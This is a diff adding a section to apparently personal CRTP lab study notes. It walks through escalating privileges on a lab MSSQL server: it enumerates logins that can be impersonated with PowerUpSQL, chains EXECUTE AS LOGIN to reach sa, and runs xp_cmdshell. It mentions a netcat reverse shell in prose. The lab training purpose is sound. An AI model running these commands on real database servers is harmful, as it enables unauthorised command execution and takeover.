@@ -2567,3 +2567,49 @@ dir \\dcorp-dc\C$
 
 ### ADCS - ESC6
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/bbdbb2bb-2506-4ad5-99a4-97da380a991f)
+
+# MSSQL Impersonate
+### Load PowerUpSQL
+```
+Import-Module .\PowerUpSQL-master\PowerUpSQL.ps1
+```
+### Check if the current user has access to the MSSQL service on another computer
+```
+Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c9e2f10d-92a6-4290-9f76-0306a3499ddb)
+
+as we can see our user `"pastudent131"` has access to MSSQL service on a different computer `"UFC-SQLDev.us.funcorp.local"`
+
+But the problem is that our private user does not have SysAdmin privileges, so we cannot execute commands on the system that runs MSSQL Service in order to get Reverse Shell.
+
+### Now we will see which users we can try to impersonate
+```
+Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/03f01ad2-be06-4802-b56f-7f5e9d9ef07c)
+
+as we can see. we can Impersonate two users who are `"sa"` & `"dbuser"` but we don't know which user has sysadmin privilege
+
+therefore, we will execute a command that will show us which user has sysadmin permission
+```
+Invoke-SQLAuditPrivImpersonateLogin -Instance ufc-sqldev -Verbose -Debug -Exploit
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2689662b-8575-4e8f-8dfc-64822aea4660)
+
+If we notice that it's mentioned, any user present in the RDPUsers group can impersonate the user dbuser, but he does not have sysadmin privileges.
+
+The dbuser user can impersonate the sa user and has SysAdmin privileges
+
+1. Impersonate `"dbuser"` then we will impersonate `"sa"` user
+We will execute this command so that the dbuser user will impersonate us, then the sa user will execute the whoami command on the ufc-sqldev device.
+```
+Get-SQLQuery -Verbose -instance ufc-sqldev -Query "EXECUTE AS LOGIN = 'dbuser';EXECUTE AS LOGIN = 'sa';exec xp_cmdshell 'whoami' "  -User USFUN\pastudent131
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5f88f3f4-09a3-4b1c-bd45-cd4dc36f446d)
+
+Cool!!
+
+3. Now I will open the http server and transfer the Invoke-PowerShellTcp script to get Reverse Shell, and I will start eavesdropping using netcat.
+
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/9b25092c-4f0a-4fe8-be12-5d99b9bb354e)
